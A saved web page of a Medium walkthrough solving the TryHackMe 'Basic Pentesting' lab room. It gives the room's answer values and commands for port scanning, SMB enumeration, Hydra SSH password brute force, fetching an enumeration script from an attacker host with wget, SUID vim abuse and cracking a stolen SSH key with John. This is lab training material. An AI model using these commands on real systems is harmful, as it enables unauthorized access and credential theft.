<!-- This Source Code Form is subject to the terms of the Mozilla Public
   - License, v. 2.0. If a copy of the MPL was not distributed with this file,
   - You can obtain one at http://mozilla.org/MPL/2.0/. -->
<!DOCTYPE html>
<html lang="es-ES" dir="ltr" platform="win"><head>
    <title id="reader-title">TryHackMe: Basic Pentesting — Walkthrough | by Jasper Alblas | Medium</title>
    <meta http-equiv="Content-Security-Policy" content="default-src chrome:; img-src data: *; media-src *; object-src 'none'">
    <meta content="text/html; charset=UTF-8" http-equiv="content-type">
    <meta name="viewport" content="width=device-width; user-scalable=0">
    <link rel="stylesheet" href="chrome://global/skin/aboutReader.css" type="text/css">
    <link rel="localization" href="toolkit/about/aboutReader.ftl">
    <link rel="localization" href="toolkit/branding/brandings.ftl">
  <link rel="stylesheet" href="chrome://global/skin/narrate.css"><link rel="shortcut icon" href="https://miro.medium.com/v2/1*m-R_BkNf1Qjr1YbyOIJY2w.png"></head>

  <body class="light sans-serif loaded" style="--font-size: 20px; --content-width: 30em;">
    <div class="top-anchor"></div>

    <div id="toolbar" class="toolbar-container">
      <div class="toolbar reader-toolbar">
        <div class="reader-controls" articledir="ltr">
          <button class="close-button toolbar-button" aria-labelledby="toolbar-close" data-telemetry-id="reader-close">
            <span class="hover-label" id="toolbar-close" data-l10n-id="about-reader-toolbar-close">Cerrar vista de lectura</span>
          </button>
          <ul class="dropdown style-dropdown">
            <li>
              <button class="dropdown-toggle toolbar-button style-button" aria-labelledby="toolbar-type-controls" data-telemetry-id="reader-type-controls">
                <span class="hover-label" id="toolbar-type-controls" data-l10n-id="about-reader-toolbar-type-controls">Controles de tipografía</span>
              </button>
            </li>
            <li class="dropdown-popup">
              <div class="dropdown-arrow"></div>
              <div class="font-type-buttons radiorow"><input id="radio-itemsans-serif-button" type="radio" class="radio-button" name="font-type" checked="checked"><label for="radio-itemsans-serif-button" class="sans-serif-button" data-l10n-id="about-reader-font-type-sans-serif" checked="true">Sans-serif</label><input id="radio-itemserif-button" type="radio" class="radio-button" name="font-type"><label for="radio-itemserif-button" class="serif-button" data-l10n-id="about-reader-font-type-serif">Serif</label></div>
              <div class="font-size-buttons buttonrow">
                <button class="minus-button" data-l10n-id="about-reader-toolbar-minus" title="Disminuir tamaño de fuente"></button>
                <span class="font-size-value">5</span>
                <button class="plus-button" data-l10n-id="about-reader-toolbar-plus" title="Aumentar tamaño de fuente"></button>
              </div>
              <div class="content-width-buttons buttonrow">
                <button class="content-width-minus-button" data-l10n-id="about-reader-toolbar-contentwidthminus" title="Disminuir anchura del contenido"></button>
                <span class="content-width-value">3</span>
                <button class="content-width-plus-button" data-l10n-id="about-reader-toolbar-contentwidthplus" title="Aumentar anchura del contenido"></button>
              </div>
              <div class="line-height-buttons buttonrow">
                <button class="line-height-minus-button" data-l10n-id="about-reader-toolbar-lineheightminus" title="Disminuir longitud de línea"></button>
                <span class="line-height-value">4</span>
                <button class="line-height-plus-button" data-l10n-id="about-reader-toolbar-lineheightplus" title="Aumentar longitud de línea"></button>
              </div>
              <div class="color-scheme-buttons radiorow"><input id="radio-itemlight-button" type="radio" class="radio-button" name="color-scheme"><label for="radio-itemlight-button" class="light-button" data-l10n-id="about-reader-color-scheme-light" title="Esquema de color claro">Claro</label><input id="radio-itemdark-button" type="radio" class="radio-button" name="color-scheme"><label for="radio-itemdark-button" class="dark-button" data-l10n-id="about-reader-color-scheme-dark" title="Esquema de color oscuro">Oscuro</label><input id="radio-itemsepia-button" type="radio" class="radio-button" name="color-scheme"><label for="radio-itemsepia-button" class="sepia-button" data-l10n-id="about-reader-color-scheme-sepia" title="Esquema de color sepia">Sepia</label><input id="radio-itemauto-button" type="radio" class="radio-button" name="color-scheme" checked="checked"><label for="radio-itemauto-button" class="auto-button" data-l10n-id="about-reader-color-scheme-auto" checked="true" title="Esquema de color automático">Auto</label></div>
            </li>
          </ul>
        <ul class="dropdown narrate-dropdown"><li><button class="dropdown-toggle toolbar-button narrate-toggle" data-telemetry-id="reader-listen" aria-label="Escuchar (N)"><span class="hover-label">Escuchar (N)</span></button></li><li class="dropdown-popup"><div class="narrate-row narrate-control"><button class="narrate-skip-previous" disabled="disabled" title="Atrás"></button><button class="narrate-start-stop" title="Iniciar (N)"></button><button class="narrate-skip-next" disabled="disabled" title="Siguiente"></button></div><div class="narrate-row narrate-rate"><input class="narrate-rate-input" value="0" step="5" max="100" min="-100" type="range" title="Velocidad"></div><div class="narrate-row narrate-voices"><div class="voiceselect voice-select"><button class="select-toggle" aria-controls="voice-options">
      <span class="label">Voz:</span> <span class="current-voice">Por omisión</span>
    </button>
    <div class="options" id="voice-options" role="listbox"><button data-value="automatic" class="option selected" tabindex="-1" role="option" aria-selected="true">Por omisión</button><button data-value="urn:moz-tts:sapi:Microsoft Zira Desktop - English (United States)?en-US" class="option" tabindex="-1" role="option">Microsoft Zira Desktop - English (United States)</button></div></div></div><div class="dropdown-arrow"></div></li></ul><button data-buttonid="pocket-button" data-telemetry-id="reader-save-to-pocket" class="toolbar-button pocket-button" aria-labelledby="label-pocket-button" style="background-image: url(&quot;chrome://global/skin/icons/pocket.svg&quot;);"><span class="hover-label" id="label-pocket-button" data-l10n-id="about-reader-toolbar-savetopocket">Guardar en Pocket</span></button></div>
      </div>
    </div>

    <div class="container" style="--line-height: 1.6em;" lang="en" dir="ltr">
      <div class="header reader-header reader-show-element">
        <a class="domain reader-domain" href="https://medium.com/@JAlblas/tryhackme-basic-pentesting-walkthrough-9a1821f1d7c6">medium.com</a>
        <div class="domain-border"></div>
        <h1 class="reader-title">TryHackMe: Basic Pentesting — Walkthrough - Jasper Alblas - Medium</h1>
        <div class="credits reader-credits">Jasper Alblas</div>
        <div class="meta-data">
          <div class="reader-estimated-time" data-l10n-args="{&quot;range&quot;:&quot;6-8&quot;,&quot;rangePlural&quot;:&quot;other&quot;}" data-l10n-id="about-reader-estimated-read-time" dir="ltr">6-8 minutos</div>
        </div>
      </div>

      <hr>

      <div class="content">
        <div class="moz-reader-content reader-show-element"><div id="readability-page-1" class="page"><div><div><a rel="noopener follow" href="https://medium.com/@JAlblas?source=post_page-----9a1821f1d7c6--------------------------------"><div aria-hidden="false" aria-describedby="3" aria-labelledby="3"><p><img alt="Jasper Alblas" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20EKalPgLvETNbnMww9u_WxA.jpg" width="44" height="44" data-testid="authorPhoto" class="moz-reader-block-img"></p></div></a></div><p id="1e95" data-selectable-paragraph="">Hi!
 It is time to look at the Basic Pentesting room on TryHackMe. I am 
making these walkthroughs to keep myself motivated to learn cyber 
security, and ensure that I remember the knowledge gained by THMs rooms.<br>Join me on learning cyber security. I will try and explain concepts as I go, to differentiate myself from other walkthroughs.</p><p id="40dc" data-selectable-paragraph="">Room URL: <a href="https://tryhackme.com/room/basicpentestingjt" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/basicpentestingjt</a></p></div><div><h2 id="85a9" data-selectable-paragraph="">Task 1 (Web App Testing and Privilege Escalation)</h2><p id="0fe5" data-selectable-paragraph="">In these set of tasks you’ll learn the following:</p><ul><li id="9045" data-selectable-paragraph="">brute forcing</li><li id="40a8" data-selectable-paragraph="">hash cracking</li><li id="b5c2" data-selectable-paragraph="">service enumeration</li><li id="fa95" data-selectable-paragraph="">Linux Enumeration</li></ul><p id="dfd5" data-selectable-paragraph="">Credits to <a href="https://www.vulnhub.com/author/josiah-pierce,569/" rel="noopener ugc nofollow" target="_blank">Josiah Pierce</a> from Vulnhub.</p><h2 id="5878" data-selectable-paragraph="">Questions</h2><p id="3e86" data-selectable-paragraph=""><strong>Deploy the machine and connect to our network</strong></p><blockquote><p id="2d7b" data-selectable-paragraph=""><strong><em>Answer</em></strong><em>: No answer needed</em></p></blockquote><p id="fb93" data-selectable-paragraph=""><strong>Find the services exposed by the machine</strong></p><p id="acd0" data-selectable-paragraph="">This time I decided to use the following command:</p><pre><span id="b069" data-selectable-paragraph="">nmap -sC -sV -oN nmap -p- &lt;target ip&gt;</span></pre><p id="547a" data-selectable-paragraph="">The open ports are:</p><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="424" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20ES3ixxz1fssgkOUQyFINRQ.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Port mapping!</figcaption></figure><p id="187a" data-selectable-paragraph="">We can see a SSH service, SMB, a webserver, in addition to Jserv and Tomcat.</p><p id="af91" data-selectable-paragraph="">And the script results:</p><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="325" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20qtJSB4nG98zEkFHlDmKf6g.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Nmap script results</figcaption></figure><blockquote><p id="09c3" data-selectable-paragraph=""><strong><em>Answer</em></strong><em>: No answer needed</em></p></blockquote><p id="dd35" data-selectable-paragraph=""><strong>What is the name of the hidden directory on the web server(enter name without /)?</strong></p><p id="4687" data-selectable-paragraph="">There is a web server running on port 80:</p><figure><div><picture><source type="image/webp"><source data-testid="og"><img alt="" width="626" height="261" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20_ZcfqLT0UIEoM6iUu-rttQ.png" class="moz-reader-block-img"></picture></div><figcaption data-selectable-paragraph="">Visiting the home page</figcaption></figure><p id="9250" data-selectable-paragraph="">We can take a look at the source code:</p><figure><div><picture><source type="image/webp"><source data-testid="og"><img alt="" width="587" height="213" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20Lfq5dq8iaY70pe8EGYfWng.png" class="moz-reader-block-img"></picture></div><figcaption data-selectable-paragraph="">Looking at the source code</figcaption></figure><p id="9783" data-selectable-paragraph="">Dev section…hmm.</p><p id="8eb8" data-selectable-paragraph="">Let’s search for hidden directories by using dirbuster or gobuster. We will use gobuster here. We can use the following command:</p><pre><span id="27fb" data-selectable-paragraph="">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u &lt;target ip&gt;</span></pre><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="227" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%2029tRxsmX6rB9piJykDAf8Q.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Using gobuster</figcaption></figure><p id="63d3" data-selectable-paragraph="">We found found a development page. Maybe this is the one referred to in the source code!</p><blockquote><p id="a6a5" data-selectable-paragraph=""><strong><em>Answer</em></strong><em>: development</em></p></blockquote><p id="e804" data-selectable-paragraph=""><strong>User brute-forcing to find the username &amp; password</strong></p><p id="e20f" data-selectable-paragraph="">Let’s have a look at the page we found:</p><figure><div><picture><source type="image/webp"><source data-testid="og"><img alt="" width="594" height="409" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20kEHnCSDIMJSn9zS7q1L4Ww.png" class="moz-reader-block-img"></picture></div><figcaption data-selectable-paragraph="">Accessing the development page</figcaption></figure><p id="5704" data-selectable-paragraph="">Interesting. We get to see the files in the directory. Let’s have a look at both:</p><p id="500f" data-selectable-paragraph="">dev.txt:</p><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="235" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20P3bFRkoZrPAMZMxZRBW6dQ.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Reading dev.txt</figcaption></figure><p id="982d" data-selectable-paragraph="">j.txt:</p><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="219" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20Q3581LZLy240zEkwmW0y_g.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Reading j.txt</figcaption></figure><p id="e7a1" data-selectable-paragraph="">A
 bunch of info here. We learn about Apache and SMB, but more importantly
 the author of dev.txt mentions Apache Struts, which is a Java Web 
Application framework. In addition he mentions version 2.5.12 and that 
he used a REST version.</p><p id="6355" data-selectable-paragraph="">In the other file we get a hint about weak credentials found in the /etc/shadow file.</p><p id="5a09" data-selectable-paragraph="">But we don’t have access to to the system yet!</p><p id="d144" data-selectable-paragraph="">Remember back from the port scanning that we discovered SMB? Let’s enumerate that. We do this with the following command:</p><pre><span id="e2b0" data-selectable-paragraph="">enum4linux &lt;target ip&gt;</span></pre><p id="7e4c" data-selectable-paragraph="">This gives us a bunch of info on the SMB service:</p><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="564" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20u7lAGFkndIS_sqq6K4YWjQ.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Running enum4linux</figcaption></figure><p id="495a" data-selectable-paragraph="">We
 can see that anonymous access is possible using ‘’ as username and ‘’ 
as password. A bit further below we read the following lines:</p><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="75" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20h-3PYrCZWx0Cm_hx-XZOzA.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Discovered two user accounts</figcaption></figure><p id="c899" data-selectable-paragraph="">Jan and Kay. Sure sounds like the users mentioned in j.txt. So we can pretty much conclude that Jan has a weak password.</p><p id="f53f" data-selectable-paragraph="">Let’s try bruteforce Jan’s account with Hydra! We can use the following command:</p><pre><span id="2f03" data-selectable-paragraph="">hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://&lt;target ip&gt;</span></pre><p id="aad8" data-selectable-paragraph="">Let it run for a bit and you will find the answer:</p><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="108" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20aN5Fs6MlYtSpWHq8qeolyw.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Cracking Jan’s SSH access</figcaption></figure><p id="ebf4" data-selectable-paragraph="">Armando!</p><blockquote><p id="6274" data-selectable-paragraph=""><strong><em>Answer</em></strong><em>: No answer needed</em></p></blockquote><p id="9cbd" data-selectable-paragraph=""><strong>What is the username?</strong></p><blockquote><p id="2a21" data-selectable-paragraph=""><strong><em>Answer</em></strong><em>: jan</em></p></blockquote><p id="6ea4" data-selectable-paragraph="">BONUS:</p><p id="54c0" data-selectable-paragraph="">We could also have figured this out by accessing the anonymous share through smbclient:</p><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="180" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20R53bdyiwCfP0L9b-Zn_QhQ.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Accessing the SMB anonymous share</figcaption></figure><p id="6942" data-selectable-paragraph="">If we read this txt file:</p><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="112" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%208F87a-uIJokmNrAarWyqMw.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Reading staff.txt</figcaption></figure><p id="5120" data-selectable-paragraph=""><strong>What is the password?</strong></p><p id="7262" data-selectable-paragraph="">See above to find the cracked password.</p><blockquote><p id="7e97" data-selectable-paragraph=""><strong><em>Answer</em></strong><em>: armando</em></p></blockquote><p id="fdef" data-selectable-paragraph=""><strong>What service do you use to access the server(answer in abbreviation in all caps)?</strong></p><p id="974b" data-selectable-paragraph="">We have seen a SSH service running.</p><blockquote><p id="fef9" data-selectable-paragraph=""><strong><em>Answer</em></strong><em>: SSH</em></p></blockquote><p id="4ebd" data-selectable-paragraph=""><strong>Enumerate the machine to find any vectors for privilege escalation</strong></p><p id="7510" data-selectable-paragraph="">We can now login with SSH. We can use the following command:</p><pre><span id="8831" data-selectable-paragraph="">ssh jan@&lt;ip&gt;</span></pre><p id="f011" data-selectable-paragraph="">Then write the password when prompted. We get access to jan’s home directory:</p><figure><div><picture><source type="image/webp"><source data-testid="og"><img alt="" width="485" height="52" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20kFOUlemYMZSaU1lv-YKKww.png" class="moz-reader-block-img"></picture></div><figcaption data-selectable-paragraph="">Logging into SSH</figcaption></figure><p id="3b39" data-selectable-paragraph="">If we look a bit further we can get into Kay’s home directory as well:</p><figure><div><picture><source type="image/webp"><source data-testid="og"><img alt="" width="332" height="148" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%201XavvbOuNYM0vkuEjvOQpQ.png" class="moz-reader-block-img"></picture></div><figcaption data-selectable-paragraph="">Finding Kay’s home directory</figcaption></figure><p id="5a7d" data-selectable-paragraph="">We can see pass.bak, which is a backup of some kind. Maybe a password?</p><p id="3a10" data-selectable-paragraph="">To
 be able to get escalated privileges we can use a tool such as LinEnum 
to get more info on possible attack vectors. We need to do the 
following:</p><ol><li id="81eb" data-selectable-paragraph="">Download LinEnum from here: <a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" rel="noopener ugc nofollow" target="_blank">https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</a><br>You can copy the RAW text and enter it into a file called LinEnum.</li><li id="bd0e" data-selectable-paragraph="">Startup a simple Python web server from the directory of the new file: <strong><em>python -m http.server 8000</em></strong>.</li><li id="3570" data-selectable-paragraph="">Download the file from the target machine:<strong><em> wget http://&lt;attacker ip&gt;:8000/LinEnum</em></strong></li><li id="b9a2" data-selectable-paragraph="">You need to give yourself executable privileges on the file: <em>chmod +x LinEnum</em></li><li id="cacd" data-selectable-paragraph="">Run it!</li></ol><p id="d90f" data-selectable-paragraph=""><em>Alternatively you can use scp to copy it over!</em></p><p id="9a06" data-selectable-paragraph="">Read through the results. I will paste a few interesting tidbits here:</p><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="80" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20EpZY4nOo5NTB5RF202jpQA.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">LinEnum admin user results</figcaption></figure><p id="20f6" data-selectable-paragraph="">We can see that Kay is an admin.</p><figure><div><picture><source type="image/webp"><source data-testid="og"><img alt="" width="500" height="110" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20xQ0tzDFG7dRUaQAZjsmQhg.png" class="moz-reader-block-img"></picture></div><figcaption data-selectable-paragraph="">Can we write/write sensitive files?</figcaption></figure><p id="67ac" data-selectable-paragraph="">We can read the passwd file, but not the shadow file.</p><figure><div><picture><source type="image/webp"><source data-testid="og"><img alt="" width="582" height="61" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20RQU8gO73pO7HnB4gDM_42g.png" class="moz-reader-block-img"></picture></div><figcaption data-selectable-paragraph="">Possibly interesting SUID file</figcaption></figure><p id="4ca1" data-selectable-paragraph="">Now
 this is interesting. Vim.basic is a SUID file, meaning we can run it 
with root privileges. Now we can use vim to read the pass.bak file from 
earlier!</p><figure><div><picture><source type="image/webp"><source data-testid="og"><img alt="" width="575" height="68" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20obQyX3LVUN6p51bOuEZV3g.png" class="moz-reader-block-img"></picture></div><figcaption data-selectable-paragraph="">Reading the pass.bak file</figcaption></figure><p id="0c2d" data-selectable-paragraph="">This is actually the answer to the final question!</p><p id="a272" data-selectable-paragraph="">We can now change user with the new password:</p><figure><div><picture><source type="image/webp"><source data-testid="og"><img alt="" width="297" height="97" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20XFu-oSkLwxVCtYSxOMrPQw.png" class="moz-reader-block-img"></picture></div><figcaption data-selectable-paragraph="">Switching user account to kay</figcaption></figure><blockquote><p id="a048" data-selectable-paragraph=""><strong><em>Answer</em></strong><em>: No answer needed</em></p></blockquote><p id="2e9e" data-selectable-paragraph=""><strong>What is the name of the other user you found(all lower case)?</strong></p><blockquote><p id="701f" data-selectable-paragraph=""><strong><em>Answer</em></strong><em>: kay</em></p></blockquote><p id="a832" data-selectable-paragraph=""><strong>If you have found another user, what can you do with this information?</strong></p><figure><div><picture><source type="image/webp"><source data-testid="og"><img alt="" width="640" height="327" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%204bId4yP4WHSz3FijHni2LA.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Listing files in Kay’s home directory</figcaption></figure><p id="9184" data-selectable-paragraph="">Well,
 here’s the thing. I already answered the final question. But on a more 
thorough look we can find out something interesting in Kay’s .ssh 
directory. There is a private key!</p><p id="2ad6" data-selectable-paragraph="">We can try logging in:</p><pre><span id="59ea" data-selectable-paragraph="">ssh kay@10.10.225.25 -i /home/kay/.ssh/id_rsa</span></pre><p id="f311" data-selectable-paragraph="">Unfortunately we are missing a passphrase:</p><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="124" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20xMsK8VyOw8C0AdKmTEI1aw.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Trying to gain SSH access to kay</figcaption></figure><p id="586b" data-selectable-paragraph="">We can use john the ripper to crack this, specifically ssh2john. This is located on the following location:</p><figure><div><picture><source type="image/webp"><source data-testid="og"><img alt="" width="441" height="39" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20T1lGZoXpRAUoDUXumndw4g.png" class="moz-reader-block-img"></picture></div><figcaption data-selectable-paragraph="">Locating ssh2john</figcaption></figure><p id="eec2" data-selectable-paragraph="">Let’s run the following command after saving the rsa key on your attacker machine.</p><pre><span id="19af" data-selectable-paragraph="">/opt/john/ssh2john.py kay_id_rsa &gt; john_hash.txt</span></pre><p id="9b76" data-selectable-paragraph="">Now we can run John:</p><pre><span id="eec0" data-selectable-paragraph="">john john_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</span></pre><p id="7723" data-selectable-paragraph="">And we find the passphrase:</p><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="199" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%20cGk6WlK0Jp8XyJZlkDZ-Mg.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Finding the passphrase with john</figcaption></figure><p id="b2c6" data-selectable-paragraph="">Now we can login:</p><figure><div role="button" tabindex="0"><picture><source type="image/webp"><source data-testid="og"><img alt="" width="700" height="334" role="presentation" src="TryHackMe%20Basic%20Pentesting%20%E2%80%94%20Walkthrough%20by%20Jasper%20Alblas%20Medium_files/1%202djo8wORNhnBrvSdLoTu1A.png" class="moz-reader-block-img" moz-reader-center="true"></picture></div><figcaption data-selectable-paragraph="">Logging into Kay’s SSH</figcaption></figure><pre><span id="1bf8" data-selectable-paragraph="">ssh kay@10.10.225.25 -i /home/kay/.ssh/id_rsa</span></pre><p id="7060" data-selectable-paragraph="">And enter the passphrase beeswax.</p><p id="ae55" data-selectable-paragraph="">This was another way in!</p><blockquote><p id="1c20" data-selectable-paragraph=""><strong><em>Answer</em></strong><em>: No answer needed</em></p></blockquote><p id="f1ee" data-selectable-paragraph=""><strong>What is the final password you obtain?</strong></p><p id="dca1" data-selectable-paragraph="">We found this earlier through vim.</p><blockquote><p id="7725" data-selectable-paragraph=""><strong><em>Answer</em></strong><em>: heresareallystrongpasswordthatfollowsthepasswordpolicy</em></p></blockquote><p id="15a5" data-selectable-paragraph="">Thanks for reading. Hopefully you found out that there are many ways to get root access :)</p></div></div></div>
      </div>

      <div>
        <div class="reader-message"></div>
      </div>
      <div aria-owns="toolbar"></div>
    </div>
  

</body></html>